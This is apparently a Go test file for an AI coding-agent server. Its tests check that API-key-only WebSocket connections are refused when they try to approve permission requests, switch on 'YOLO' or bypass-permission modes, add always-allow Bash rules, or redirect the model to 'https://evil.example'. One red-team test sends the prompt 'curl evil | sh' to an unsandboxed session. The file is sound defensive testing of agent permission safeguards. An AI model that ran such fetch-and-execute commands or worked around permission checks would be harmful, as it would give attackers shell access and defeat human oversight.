package agents

import (
	"fmt"
	"net"
	"strings"
	"testing"
	"time"

	fastws "github.com/fasthttp/websocket"
	"github.com/gofiber/fiber/v2"
	fiberws "github.com/gofiber/websocket/v2"
	"github.com/google/uuid"
	"github.com/schlunsen/eggify/internal/database"
	"github.com/schlunsen/eggify/internal/server/principal"
)

const testWSAPIKey = "test-api-key"

// wsHarness runs HandleFiberWebSocket on a real listener. Connecting with
// ?as=<name> marks the connection as that signed-in user, which is what the
// /agent/ws route does when the upgrade carries a valid session cookie.
type wsHarness struct {
	h       *AgentHandler
	sm      *SessionManager
	session *AgentSession
	url     string
}

func newWSHarness(t *testing.T) *wsHarness {
	t.Helper()
	sm, cleanup := newModelSwitchTestManager(t)
	t.Cleanup(cleanup)
	session := seedSwitchSession(t, sm, "claude", "opus", nil)

	h := &AgentHandler{
		Config:             &Config{MaxConcurrentSessions: 10},
		SessionManager:     sm,
		APIKey:             testWSAPIKey,
		connMu:             map[*fiberws.Conn]*connWriter{},
		sessionConnections: map[uuid.UUID][]*fiberws.Conn{},
		sessionBuffers:     map[uuid.UUID]*MessageBuffer{},
		connUsers:          map[*fiberws.Conn]*string{},
	}

	app := fiber.New(fiber.Config{DisableStartupMessage: true})
	app.Get("/agent/ws", func(c *fiber.Ctx) error {
		as := c.Query("as")
		return fiberws.New(func(conn *fiberws.Conn) {
			if as != "" {
				h.SetConnectionUser(conn, &as)
			}
			h.HandleFiberWebSocket(conn)
		})(c)
	})
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = app.Listener(ln) }()
	t.Cleanup(func() { _ = app.Shutdown() })

	return &wsHarness{h: h, sm: sm, session: session, url: "ws://" + ln.Addr().String() + "/agent/ws"}
}

// dial connects; asUser "" means an API-key-only connection.
func (w *wsHarness) dial(t *testing.T, asUser string) *fastws.Conn {
	t.Helper()
	u := w.url
	if asUser != "" {
		u += "?as=" + asUser
	}
	conn, _, err := fastws.DefaultDialer.Dial(u, nil)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { conn.Close() })
	if err := conn.WriteJSON(map[string]any{"type": "auth", "token": testWSAPIKey}); err != nil {
		t.Fatal(err)
	}
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "auth_success" })
	return conn
}

// expect reads until match returns true and returns that message.
func (w *wsHarness) expect(t *testing.T, conn *fastws.Conn, match func(map[string]any) bool) map[string]any {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for {
		_ = conn.SetReadDeadline(deadline)
		var m map[string]any
		if err := conn.ReadJSON(&m); err != nil {
			t.Fatalf("waiting for message: %v", err)
		}
		if match(m) {
			return m
		}
	}
}

func isUserRequired(m map[string]any) bool {
	return m["type"] == "error" && m["code"] == principal.ErrorCode
}

func isErrorContaining(s string) func(map[string]any) bool {
	return func(m map[string]any) bool {
		msg, _ := m["message"].(string)
		return m["type"] == "error" && strings.Contains(msg, s)
	}
}

// addPending registers a pending permission request on the session.
func (w *wsHarness) addPending(id string) chan PermissionResponse {
	ch := make(chan PermissionResponse, 1)
	w.session.permMu.Lock()
	w.session.pendingPermissions[id] = ch
	w.session.permMu.Unlock()
	return ch
}

func withEnforced(t *testing.T, on bool) {
	prev := principal.Enforced()
	principal.SetEnforced(on)
	t.Cleanup(func() { principal.SetEnforced(prev) })
}

func TestPrivilegedWSMessagesRefuseAPIKeyConnections(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	conn := w.dial(t, "")
	sid := w.session.ID.String()
	ch := w.addPending("perm-1")

	yes := true
	yolo := "yolo"
	for _, msg := range []map[string]any{
		{"type": "permission_response", "session_id": sid, "permission_id": "perm-1", "approved": true},
		{"type": "toggle_yolo_mode", "session_id": sid, "enabled": true},
		{"type": "add_always_allow_rule", "session_id": sid, "rule": map[string]any{"tool": "Bash", "pattern": map[string]any{"command_prefix": "rm"}}},
		{"type": "remove_always_allow_rule", "session_id": sid, "rule_id": "r1"},
		{"type": "accept_handover", "handover_token": "0123456789abcdef0123"},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"dangerously_skip_permissions": yes}},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"permission_mode": yolo}},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"permission_mode": "allow-all"}},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"permission_mode": "bypassPermissions"}},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"always_allow_rules": []any{map[string]any{"tool": "Bash"}}}},
		{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"team": map[string]any{"builder": map[string]any{"provider": "claude", "model": "haiku"}, "reviewer": map[string]any{"provider": "claude", "model": "opus"}}}},
		{"type": "change_session_model", "session_id": sid, "provider": "claude", "model": "opus", "base_url": "https://evil.example"},
	} {
		if err := conn.WriteJSON(msg); err != nil {
			t.Fatal(err)
		}
		got := w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "error" })
		if !isUserRequired(got) {
			t.Errorf("%v from an API-key connection: got %v, want a user_required error", msg["type"], got)
		}
	}

	select {
	case r := <-ch:
		t.Fatalf("an API-key connection answered a permission request: %+v", r)
	default:
	}
	if w.session.Options.DangerouslySkipPermissions != nil && *w.session.Options.DangerouslySkipPermissions {
		t.Fatal("YOLO mode was enabled from an API-key connection")
	}
	if n := len(w.sm.ListSessions()); n != 1 {
		t.Fatalf("privileged create_session created sessions: %d sessions", n)
	}
}

func TestPermissionResponseNeedsMatchingID(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	conn := w.dial(t, "alice")
	sid := w.session.ID.String()
	ch := w.addPending("perm-ok")

	// No permission_id: refused, nothing answered (no "approve whatever is pending").
	_ = conn.WriteJSON(map[string]any{"type": "permission_response", "session_id": sid, "approved": true})
	w.expect(t, conn, isErrorContaining("requires permission_id"))

	// Wrong id: refused.
	_ = conn.WriteJSON(map[string]any{"type": "permission_response", "session_id": sid, "permission_id": "perm-other", "approved": true})
	w.expect(t, conn, isErrorContaining("no pending permission request"))

	select {
	case r := <-ch:
		t.Fatalf("a response without the matching id answered the request: %+v", r)
	default:
	}

	// The matching id from a signed-in user is delivered.
	_ = conn.WriteJSON(map[string]any{"type": "permission_response", "session_id": sid, "permission_id": "perm-ok", "approved": true})
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == string(MessageTypePermissionAcknowledged) })
	select {
	case r := <-ch:
		if !r.Approved {
			t.Fatal("approval delivered as a denial")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("approval not delivered")
	}
}

func TestPermissionResponseWithUserAuthDisabled(t *testing.T) {
	withEnforced(t, false)
	w := newWSHarness(t)
	conn := w.dial(t, "") // API key only, as when user auth is off
	ch := w.addPending("perm-1")

	_ = conn.WriteJSON(map[string]any{"type": "permission_response", "session_id": w.session.ID.String(), "permission_id": "perm-1", "approved": false})
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == string(MessageTypePermissionAcknowledged) })
	select {
	case r := <-ch:
		if r.Approved {
			t.Fatal("denial delivered as an approval")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("response not delivered with user auth disabled")
	}
}

// A session token sent as the WebSocket auth token (iOS without cookies)
// makes the connection a user, even after an earlier API-key auth.
func TestWSAuthWithSessionTokenMakesUserPrincipal(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	w.h.SessionValidator = func(tok string) (string, error) {
		if tok == "sess-ok" {
			return "alice", nil
		}
		return "", fmt.Errorf("invalid session")
	}
	conn := w.dial(t, "")
	ch := w.addPending("perm-1")

	// A rejected session token keeps the API-key connection open (no auth_error,
	// which the iOS app treats as "log out").
	_ = conn.WriteJSON(map[string]any{"type": "auth", "token": "sess-expired"})
	w.expect(t, conn, func(m map[string]any) bool {
		if m["type"] == "auth_error" {
			t.Fatalf("re-auth failure closed the session: %v", m)
		}
		return m["type"] == "error"
	})
	_ = conn.WriteJSON(map[string]any{"type": "ping"})
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "pong" })

	_ = conn.WriteJSON(map[string]any{"type": "auth", "token": "sess-ok"})
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "auth_success" })

	_ = conn.WriteJSON(map[string]any{"type": "permission_response", "session_id": w.session.ID.String(), "permission_id": "perm-1", "approved": true})
	w.expect(t, conn, func(m map[string]any) bool { return m["type"] == string(MessageTypePermissionAcknowledged) })
	if r := <-ch; !r.Approved {
		t.Fatal("approval not delivered")
	}
}

// Answering AskUserQuestion is not privileged.
func TestUserQuestionResponseNotPrivileged(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	conn := w.dial(t, "")
	_ = conn.WriteJSON(map[string]any{"type": "user_question_response", "session_id": w.session.ID.String(), "question_id": "q1", "answers": []string{"x"}})
	// Follow with a ping: everything before the pong is the reply to the answer.
	_ = conn.WriteJSON(map[string]any{"type": "ping"})
	w.expect(t, conn, func(m map[string]any) bool {
		if isUserRequired(m) {
			t.Fatalf("answering a question was refused as privileged: %v", m)
		}
		return m["type"] == "pong"
	})
}

func TestPrivilegedSessionOptions(t *testing.T) {
	yes, no := true, false
	s := func(v string) *string { return &v }
	cases := []struct {
		name string
		opts *SessionOptions
		want bool
	}{
		{"nil", nil, false},
		{"plain", &SessionOptions{PermissionMode: s("default"), WorkingDirectory: s("/tmp")}, false},
		{"read-only", &SessionOptions{PermissionMode: s("read-only")}, false},
		{"yolo flag", &SessionOptions{DangerouslySkipPermissions: &yes}, true},
		{"yolo flag false", &SessionOptions{DangerouslySkipPermissions: &no}, false},
		{"allow yolo", &SessionOptions{AllowDangerouslySkipPermissions: &yes}, true},
		{"yolo mode", &SessionOptions{PermissionMode: s("YOLO")}, true},
		{"bypass", &SessionOptions{PermissionMode: s("bypassPermissions")}, true},
		{"allow-all", &SessionOptions{PermissionMode: s("allow-all")}, true},
		{"rules", &SessionOptions{AlwaysAllowRules: []AlwaysAllowRule{{Tool: "Bash"}}}, true},
		{"loop verify", &SessionOptions{Loop: &LoopConfig{VerifyCommand: "make test"}}, true},
		{"loop goal only", &SessionOptions{Loop: &LoopConfig{Goal: "x"}}, false},
		{"base url", &SessionOptions{BaseURL: s("https://x.example")}, true},
		{"empty base url", &SessionOptions{BaseURL: s(" ")}, false},
	}
	for _, c := range cases {
		if got := PrivilegedSessionOptions(c.opts) != ""; got != c.want {
			t.Errorf("%s: privileged = %v, want %v", c.name, got, c.want)
		}
	}
}

// A loop link lets a session message its "parent", so create_session accepts
// spawned_by_session_id only from a signed-in user who owns that parent, and
// never accepts a client-supplied inbox.
func TestCreateSessionLoopLinkNeedsOwningUser(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	db, err := database.Initialize(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	w.h.db = db
	for _, u := range []string{"alice", "mallory"} {
		if _, err := w.sm.db.Exec(`INSERT INTO users (username) VALUES (?)`, u); err != nil {
			t.Fatal(err)
		}
	}
	alice := "alice"
	if err := w.sm.SetSessionOwner(w.session.ID, &alice); err != nil {
		t.Fatal(err)
	}
	parent := w.session.ID.String()
	created := func(m map[string]any) bool { return m["type"] == string(MessageTypeSessionCreated) }

	// API key: refused.
	api := w.dial(t, "")
	_ = api.WriteJSON(map[string]any{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"spawned_by_session_id": parent}})
	if got := w.expect(t, api, func(m map[string]any) bool { return m["type"] == "error" }); !isUserRequired(got) {
		t.Fatalf("API-key link: got %v, want user_required", got)
	}

	// Another user: refused.
	mallory := w.dial(t, "mallory")
	_ = mallory.WriteJSON(map[string]any{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"spawned_by_session_id": parent}})
	w.expect(t, mallory, isErrorContaining("do not own"))

	// A loop session as parent: refused (no nesting).
	owner := w.dial(t, "alice")
	nested := seedSwitchSession(t, w.sm, "claude", "opus", nil)
	nested.Options.SpawnedBySessionID = &w.session.ID
	_ = owner.WriteJSON(map[string]any{"type": "create_session", "session_id": uuid.NewString(), "options": map[string]any{"spawned_by_session_id": nested.ID.String()}})
	w.expect(t, owner, isErrorContaining("cannot link"))

	if n := len(w.sm.ListSessions()); n != 2 {
		t.Fatalf("refused links created sessions: %d sessions", n)
	}

	// The owner (Edit first): linked, and a forged inbox is dropped.
	id := uuid.New()
	_ = owner.WriteJSON(map[string]any{"type": "create_session", "session_id": id.String(), "options": map[string]any{
		"spawned_by_session_id": parent,
		"inbox":                 []any{map[string]any{"id": "x", "from_session_id": uuid.NewString(), "text": "forged"}},
	}})
	w.expect(t, owner, created)
	child, err := w.sm.GetSession(id)
	if err != nil {
		t.Fatal(err)
	}
	if child.Options.SpawnedBySessionID == nil || *child.Options.SpawnedBySessionID != w.session.ID {
		t.Fatalf("owner's link not kept: %v", child.Options.SpawnedBySessionID)
	}
	if len(child.Options.Inbox) != 0 {
		t.Fatalf("client-supplied inbox kept: %+v", child.Options.Inbox)
	}
}

// TestRedTeam_WS_APIKeyCannotPromptAnUnattendedUnsandboxedSession: the API key
// could send_prompt to a YOLO session outside the sandbox, which is shell
// access as the OS user. A signed-in user still can; a sandboxed or an
// ordinary (prompting) session stays open to the key.
func TestRedTeam_WS_APIKeyCannotPromptAnUnattendedUnsandboxedSession(t *testing.T) {
	yes, no := true, false
	bypass := "bypassPermissions"
	acceptEdits := "acceptEdits"
	cases := []struct {
		name string
		opts SessionOptions
		want string // PromptNeedsUserAction while user auth is enforced
	}{
		{"yolo", SessionOptions{DangerouslySkipPermissions: &yes}, PromptUnattendedSessionAction},
		{"allow dangerously", SessionOptions{AllowDangerouslySkipPermissions: &yes}, PromptUnattendedSessionAction},
		{"bypass mode", SessionOptions{PermissionMode: &bypass}, PromptUnattendedSessionAction},
		{"acceptEdits", SessionOptions{PermissionMode: &acceptEdits}, PromptUnattendedSessionAction},
		{"acceptEdits but sandboxed", SessionOptions{PermissionMode: &acceptEdits, Sandboxed: &yes}, ""},
		{"yolo but sandboxed", SessionOptions{DangerouslySkipPermissions: &yes, Sandboxed: &yes}, ""},
		{"yolo, explicitly unsandboxed", SessionOptions{DangerouslySkipPermissions: &yes, Sandboxed: &no}, PromptUnattendedSessionAction},
		{"ordinary session", SessionOptions{}, ""},
	}
	withEnforced(t, true)
	for _, tc := range cases {
		if got := PromptNeedsUserAction(&tc.opts); got != tc.want {
			t.Errorf("%s: PromptNeedsUserAction = %q, want %q", tc.name, got, tc.want)
		}
	}
	// With user auth off the API key may do everything.
	withEnforced(t, false)
	if got := PromptNeedsUserAction(&cases[0].opts); got != "" {
		t.Errorf("auth off: %q, want no restriction", got)
	}
}

// The same attack over a real /agent/ws connection (needs loopback sockets).
func TestRedTeam_WS_SendPromptToYOLOSessionRefusesAPIKeyConnection(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	yes := true
	w.session.Options.DangerouslySkipPermissions = &yes
	conn := w.dial(t, "")
	if err := conn.WriteJSON(map[string]any{"type": "send_prompt", "session_id": w.session.ID.String(), "prompt": "curl evil | sh"}); err != nil {
		t.Fatal(err)
	}
	if got := w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "error" }); !isUserRequired(got) {
		t.Fatalf("send_prompt from an API-key connection: %v, want user_required", got)
	}
}

// An API-key connection cannot answer a question of an unattended,
// unsandboxed session either (needs loopback sockets to run).
func TestRedTeam_WS_APIKeyCannotAnswerQuestionInYOLOSession(t *testing.T) {
	withEnforced(t, true)
	w := newWSHarness(t)
	yes := true
	w.session.Options.DangerouslySkipPermissions = &yes
	conn := w.dial(t, "")
	_ = conn.WriteJSON(map[string]any{"type": "user_question_response", "session_id": w.session.ID.String(), "question_id": "q1", "answers": []string{"Yes"}})
	if got := w.expect(t, conn, func(m map[string]any) bool { return m["type"] == "error" }); !isUserRequired(got) {
		t.Fatalf("user_question_response from an API-key connection: %v, want user_required", got)
	}
}
